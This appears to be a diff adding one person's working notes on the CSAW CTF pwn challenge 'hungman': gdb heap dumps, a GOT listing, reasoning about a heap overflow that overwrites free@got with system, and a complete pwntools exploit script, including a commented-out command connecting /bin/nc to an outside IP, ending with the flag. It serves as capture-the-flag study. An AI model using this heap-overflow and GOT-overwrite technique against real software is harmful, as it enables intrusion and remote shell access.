@@ -1,0 +1,429 @@
+0x603000:	0x00000000	0x00000000	0x00000031	0x00000000
+0x603010:	0x41414141	0x41414141	0x41414141	0x41414141
+0x603020:	0x41414141	0x41414141	0x41414141	0x41414141
+0x603030:	0x00000000	0x00000000	0x00000091	0x00000000
+0x603040:	0x00000000	0x00000021	0x00603010	0x00000000
+0x603050:	0x00000000	0x00000000	0x00000000	0x00000000
+0x603060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x603070:	0x00000000	0x00000000	0x00000000	0x00000000
+0x603080:	0x00000000	0x00000000	0x00000000	0x00000000
+0x603090:	0x00000000	0x00000000	0x00000000	0x00000000
+0x6030a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x6030b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x6030c0:	0x00000000	0x00000000	0x00000031	0x00000000
+0x6030d0:	0x68697970	0x67786566	0x22a5a375	0x4dd7ace5
+0x6030e0:	0xc52aad30	0xc29e10c0	0x5a6280c6	0x7e17919e
+0x6030f0:	0x000000fc	0x00000000	0x00020f11	0x00000000
+0x603100:	0x00000000	0x00000000	0x00000000	0x00000000
+0x603110:	0x00000000	0x00000000	0x00000000	0x00000000
+0x603120:	0x00000000	0x00000000	0x00000000	0x00000000
+0x603130:	0x00000000	0x00000000	0x00000000	0x00000000
+0x603140:	0x00000000	0x00000000	0x00000000	0x00000000
+0x603150:	0x00000000	0x00000000	0x00000000	0x00000000
+0x603160:	0x00000000	0x00000000	0x00000000	0x00000000
+0x603170:	0x00000000	0x00000000	0x00000000	0x00000000
+0x603180:	0x00000000	0x00000000	0x00000000	0x00000000
+0x603190:	0x00000000	0x00000000	0x00000000	0x00000000
+0x6031a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x6031b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x6031c0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x6031d0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x6031e0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x6031f0:	0x00000000	0x00000000	0x00000000	0x00000000
+
+0x00000031 == ??
+
+k so it's a heap overflow
+
+
+struct
+map of correct stuff
+
+I can overflow 
+
+
+
+
+K so the game plan is to overflow our pointer to got free
+then we read our name gettign the address of free in libc
+then we write system to free
+
+don't forget to make the start of our name /bin/sh;
+
+
+
+gdb-peda$ x/128wx 0x1fea000
+0x1fea000:	0x00000000	0x00000000	0x00000031	0x00000000
+0x1fea010:	0x42424242	0x42424242	0x42424242	0x42424242
+0x1fea020:	0x42424242	0x42424242	0x42424242	0x42424242
+0x1fea030:	0x00000000	0x00000000	0x00000091	0x00000000
+0x1fea040:	0x00000058	0x00000020	0x01fea010	0x00000000
+			score ^					nameptr ^
+
+
+change name to "B"*32 + "BBBB"*4 + "\x00"*4 + "\x20\x00\x00\x00" + <addr_free>
+
+
+0000000000602018 R_X86_64_JUMP_SLOT  free <--- woo
+0000000000602020 R_X86_64_JUMP_SLOT  puts
+0000000000602028 R_X86_64_JUMP_SLOT  write
+0000000000602030 R_X86_64_JUMP_SLOT  __stack_chk_fail
+0000000000602038 R_X86_64_JUMP_SLOT  strchr
+0000000000602040 R_X86_64_JUMP_SLOT  printf
+0000000000602048 R_X86_64_JUMP_SLOT  snprintf
+0000000000602050 R_X86_64_JUMP_SLOT  memset
+0000000000602058 R_X86_64_JUMP_SLOT  close
+0000000000602060 R_X86_64_JUMP_SLOT  read
+0000000000602068 R_X86_64_JUMP_SLOT  __libc_start_main
+0000000000602070 R_X86_64_JUMP_SLOT  __gmon_start__
+0000000000602078 R_X86_64_JUMP_SLOT  memcpy
+0000000000602080 R_X86_64_JUMP_SLOT  malloc
+0000000000602088 R_X86_64_JUMP_SLOT  setvbuf
+0000000000602090 R_X86_64_JUMP_SLOT  open
+0000000000602098 R_X86_64_JUMP_SLOT  __isoc99_scanf
+00000000006020a0 R_X86_64_JUMP_SLOT  exit
+
+
+
+play_game("B"*32 + "BBBB"*4 + "\x00"*4 + "\x20\x00\x00\x00" + p64(free_got))
+
+0x1995000:	0x00000000	0x00000000	0x00000031	0x00000000
+0x1995010:	0x42424242	0x42424242	0x42424242	0x42424242
+0x1995020:	0x42424242	0x42424242	0x42424242	0x42424242
+0x1995030:	0x42424242	0x42424242	0x42424242	0x42424242
+0x1995040:	0x00000000	0x00000020	0x00602018	0x00000000
+
+print hungman.recvuntil('?').encode('hex') # Highest player; cont?
+
+prints name
+
+normal
+4869676865737420706c617965723a20
+424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242
+2073636f72653a20300a436f6e74696e75653f
+
+with free
+4869676865737420706c617965723a20
+2073636f72653a20300a436f6e74696e75653f
+
+
+print free
+$1 = {void (void *)} 0x7f121e43b950 <free>
+0x602018 <free@got.plt>:	0x00007f121e0f7600
+
+free has a god damn null at the start
+
+lolx
+
+this is ok 
+either it's not there and i'm fine
+or I know it's there are I know that so it's ok
+
+play_game("B"*32 + "BBBB"*4 + "\x00"*4 + "\x20\x00\x00\x00" + p64(free_got +1)) # free has a null at the start
+
+
+k so now it prints 
+4869676865737420706c617965723a20
+c6234ced7f
+2073636f72653a20300a436f6e74696e75653f
+
+
+index = resp.index("Highest player: ") + len("Highest player: ")
+addr = u64('\x00' + resp[index:index +5] + '\x00\x00')
+
+yep that gets the libc addr of free
+
+well....
+free -  what I get
+>>> 0x7f5c6645a950 - 0x7f5c66116600
+3425104
+
+maybe it's the same?
+
+>>> 0x7f69584fa950 - 0x7f69581b6600
+3425104
+
+yep
+
+$2 = {<text variable, no debug info>} 0x7f695817b490 <__libc_system>
+
+
+
+
+
+000000000007c600 <__libc_free>:
+000000000001f470 <free@plt>:
+
+0000000000041490 <__libc_system>:
+
+
+
+__GI___libc_free 0x7f69581b6600
+free@plt 0x00007f6958159470
+$5 = {void (void *)} 0x7f69584fa950 <free>
+
+
+the distance from 
+000000000007c600 <__libc_free>:
+to
+0000000000041490 <__libc_system>:
+
+will be the same after aslr
+free_libc_live = hacks...
+
+system_libc_live = free_libc_live + (system_libc - free_libc)
+
+
+
+I can't really test this locally anymore because my free has
+a null and I did that +1 trick
+
+so I can't write system
+
+wait lolz I can
+becasue the null is always there
+
+I know that the same will happen for system
+
+000000000007c600 <__libc_free>:
+0000000000041490 <__libc_system>:
+
+except system has a 90
+
+no I'm is the retard can't do that
+
+
+anyway
+locally I can just prompt myself to enter the address of free
+
+
+k so next problem
+I was hoping to write system to free
+and then when that string gets freed
+
+I'd do 
+write <addr_system>;/bin/sh to free got
+
+then
+
+free(<addr_system>;/bin/sh)
+but the nulls in the address fuck that over
+
+
+so I'm now aiming for buf 
+
+0x13fd000:	0x00000000	0x00000000	0x00000031	0x00000000
+0x13fd010:	0x42424242	0x42424242	0x42424242	0x42424242
+0x13fd020:	0x42424242	0x42424242	0x42424242	0x42424242
+0x13fd030:	0x42424242	0x42424242	0x42424242	0x42424242
+0x13fd040:	0x000000f8	0x00000022	0x00602018	0x00000000
+0x13fd050:	0x01010001	0x00010101	0x01010101	0x00000001
+0x13fd060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x13fd070:	0x00000000	0x00000000	0x00000000	0x00000000
+0x13fd080:	0x00000000	0x00000000	0x00000000	0x00000000
+0x13fd090:	0x00000000	0x00000000	0x00000000	0x00000000
+0x13fd0a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x13fd0b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x13fd0c0:	0x00000000	0x00000000	0x00000031	0x00000000
+0x13fd0d0:	0x6373646a	0x64796a75	0x646c7266	0x616b6370
+0x13fd0e0:	0x64676b69	0x74656673	0x706d6574	0xd873736c
+0x13fd0f0:	0x00000090	0x00000000	0x00000101	0x00000000
+0x13fd100:	0x2b11b490	0x00007f0d	0x69622f3b	0x636e2f6e
+0x13fd110:	0x2e323520	0x352e3236	0x39312e32	0x33312036
+
+
+
+
+
+
+
+
+
+gdb-peda$ x/100wx 0x1b34000
+0x1b34000:	0x00000000	0x00000000	0x00000031	0x00000000
+0x1b34010:	0x42424242	0x42424242	0x42424242	0x42424242
+0x1b34020:	0x42424242	0x42424242	0x42424242	0x42424242
+0x1b34030:	0x42424242	0x42424242	0x42424242	0x42424242
+0x1b34040:	0x0000008b	0x000000d0	0x01b34010	0x00000000
+0x1b34050:	0x01010101	0x01010001	0x01010001	0x00000001
+0x1b34060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x1b34070:	0x00000000	0x00000000	0x00000000	0x00000000
+0x1b34080:	0x00000000	0x00000000	0x00000000	0x00000000
+0x1b34090:	0x00000000	0x00000000	0x00000000	0x00000000
+0x1b340a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x1b340b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x1b340c0:	0x00000000	0x00000000	0x00000031	0x00000000
+0x1b340d0:	0x76786f61	0x78696362	0x68746771	0x75687565
+0x1b340e0:	0x63686377	0x646b6d65	0x77746c6c	0x07637a74
+0x1b340f0:	0x000000be	0x00000000	0x00000101	0x00000000
+0x1b34100:	0x63636363	0x63636363	0x63636363	0x63636363
+0x1b34110:	0x63636363	0x63636363	0x63636363	0x63636363
+0x1b34120:	0x42424242	0x42424242	0x42424242	0x42424242
+0x1b34130:	0x00000000	0x00000000	0x00602018	0x00000000
+0x1b34140:	0x01010101	0x01010101	0x01010101	0x01010101
+0x1b34150:	0x01010101	0x01010101	0x01010101	0x01010101
+0x1b34160:	0x01010101	0x01010101	0x01010101	0x01010101
+0x1b34170:	0x01010101	0x01010101	0x01010101	0x01010101
+0x1b34180:	0x01010101	0x01010101	0x01010101	0x01010101
+
+
+
+gdb-peda$ x/100wx 0x1b34000
+0x1b34000:	0x00000000	0x00000000	0x00000031	0x00000000
+0x1b34010:	0x63636363	0x63636363	0x63636363	0x63636363
+0x1b34020:	0x63636363	0x63636363	0x63636363	0x63636363
+0x1b34030:	0x42424242	0x42424242	0x42424242	0x42424242
+0x1b34040:	0x00000000	0x00000000	0x00602018	0x00000000
+0x1b34050:	0x01010101	0x01010101	0x01010101	0x01010101
+0x1b34060:	0x01010101	0x01010101	0x01010101	0x01010101
+0x1b34070:	0x01010101	0x01010101	0x01010101	0x01010101
+0x1b34080:	0x01010101	0x01010101	0x01010101	0x01010101
+0x1b34090:	0x01010101	0x01010101	0x01010101	0x01010101
+0x1b340a0:	0x01010101	0x01010101	0x01010101	0x01010101
+0x1b340b0:	0x01010101	0x01010101	0x01010101	0x01010101
+0x1b340c0:	0x01010101	0x01010101	0x00000031	0x00000000
+0x1b340d0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x1b340e0:	0x63686377	0x646b6d65	0x77746c6c	0x07637a74
+0x1b340f0:	0x000000be	0x00000000	0x00000101	0x00000000
+0x1b34100:	0x63636363	0x63636363	0x63636363	0x63636363
+0x1b34110:	0x63636363	0x63636363	0x63636363	0x63636363
+0x1b34120:	0x42424242	0x42424242	0x42424242	0x42424242
+0x1b34130:	0x00000000	0x00000000	0x00602018	0x00000000
+0x1b34140:	0x01010101	0x01010101	0x01010101	0x01010101
+0x1b34150:	0x01010101	0x01010101	0x01010101	0x01010101
+0x1b34160:	0x01010101	0x01010101	0x01010101	0x01010101
+0x1b34170:	0x01010101	0x01010101	0x01010101	0x01010101
+0x1b34180:	0x01010101	0x01010101	0x01010101	0x01010101
+
+
+
+[*] Switching to interactive mode
+sh: 1: \x90$\xa7�: not found
+sh: 1: ulmomtaFcccccccccccccccc: not found
+
+
+fml
+
+...
+
+
+#!/usr/bin/python
+import os
+import time
+from pwn import *
+hungman = process("./hungman")
+# hungman = remote('pwn.chal.csaw.io',8003)
+# raw_input("start?")
+letters = "abcdefghijklmnopqrstuvwxyz"
+# intro
+print hungman.recv()
+hungman.sendline("B"*32) # send name
+print hungman.recvline() # print welcome
+
+def play_game(name="B"*32,should_change="y",shell=False):
+	# raw_input('continue?')
+	ret = ""
+	for char in letters:
+		line = hungman.recvline(timeout=1) # print progress
+		print line + "bubbles"
+		if "Default Highscore" in line:
+			print "fuck"
+			print hungman.recvuntil('?') # continu?
+			hungman.send("y")
+			break
+		elif "High score!" in line:
+			print "high"
+			time.sleep(0.1)
+			hungman.send(should_change + "\n")
+			if should_change == "y":
+				time.sleep(0.1)
+				hungman.send(name)
+				if shell:
+					hungman.interactive()
+			# hungman.interactive()
+			ret =  hungman.recvuntil('?') # Highest player; cont?
+			print ret
+			hungman.send("y")
+			break
+		hungman.send(char) # send guess
+	return ret
+
+
+
+play_game()
+
+# I like to do these a few times just to
+# feel comfy :)
+free_got = 0x0000000000602018
+free_plt = 0x0000000000400800 # this jumps to what ^ that points to
+
+# initially the got will point to free_plt + 6
+# after we call free once the _dl_runtime_resolve
+# will update the got to be the libc version of free
+# from there I can work out system
+
+
+
+# cmd = ";/bin/sh;;;;;"  "a"*16+ cmd + 
+# play_game("B"*32 + "BBBB"*4 + "\x00"*4 + "\x20\x00\x00\x00")
+# play_game("B"*32 + "BBBB"*4 + "\x00"*4 + "\x20\x00\x00\x00")
+payload = 'cccccccccca;/bin/sh;cccccccccccc'
+payload += "BBBB"*4 
+payload += "\x00"*4 
+payload += "\x08\x00\x00\x00" 
+payload += p64(free_got)
+payload += '\x01'*4*(4*7 +2) # win hangman
+payload += '\x31\x00\x00\x00' # probs length of something
+payload += '\x00\x00\x00\x00'
+payload += "A"*(32-16)
+# payload += "a" # buf .. or not
+resp = play_game(payload) # +1 for local because free has a null at the start
+print resp
+index = resp.index("Highest player: ") + len("Highest player: ")
+# free_libc_live = u64('\x00' + resp[index:index +5] + '\x00\x00')
+# free_libc_live = u64(resp[index:index +6] + '\x00\x00')
+
+# free_libc_live = int(raw_input("enter free libc").rstrip(),16)
+# local
+free_libc_live = 0x7ffff7aad600
+system_libc = 0x0000000000041490
+free_libc =   0x000000000007c600
+ 
+# free_libc =   0x0000000000083a70 # <__libc_free>:
+# system_libc = 0x0000000000045380 # <__libc_system>:
+
+system_libc_live = free_libc_live + (system_libc - free_libc)
+
+print hex(free_libc_live)
+print hex(system_libc_live)
+# raw_input("did you work out system?")
+play_game(should_change="n")
+# cmd = ";/bin/nc 52.62.52.196 1337"
+# cmd = ";/bin/sh"
+play_game(p64(system_libc_live),shell=True) # write system to free
+play_game(should_change="n")
+play_game(should_change="n")
+# play_game("B"*32 + "BBBB"*4 + "\x00"*4 + "\x20\x00\x00\x00")
+play_game()
+play_game()
+play_game()
+play_game()
+play_game()
+play_game()
+play_game()
+play_game()
+play_game()
+play_game()
+play_game()
+print 'yay'
+
+# print 'yay'
+# play_game()
+# print 'yay'
+
+
+#hungman.sendline('A'*4)
+# hungman.interactive()
+
+
+flag{this_looks_like_its_a_well_hungman}
